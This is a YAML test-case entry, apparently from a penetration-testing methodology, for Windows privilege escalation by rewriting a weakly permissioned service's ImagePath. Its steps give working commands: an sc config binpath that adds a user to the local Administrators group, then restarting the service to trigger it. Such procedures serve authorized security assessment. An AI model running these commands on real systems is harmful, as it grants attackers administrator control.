---
testcase: Weak Service Permission Escalation via ImagePath Modification
platforms:
  - AD
  - Windows
methodology:
  - BlackBox
  - GreyBox
references:
  - https://attack.mitre.org/techniques/T1574/005
how-to-test: |
  1. On target, run SharpUp.exe audit to identify services with writable ACLs.
  2. Use icacls to confirm BUILTIN\Users or Authenticated Users have full control over the service executable.
  3. Execute sc config <ServiceName> binpath= "cmd /c net localgroup administrators <TestUser> /add".
  4. Stop the service with sc stop <ServiceName> to trigger execution of the modified ImagePath.
  5. Start the service with sc start <ServiceName> and observe failed start (expected), but command runs.
  6. Verify <TestUser> has been added to the local Administrators group via net localgroup administrators.
---
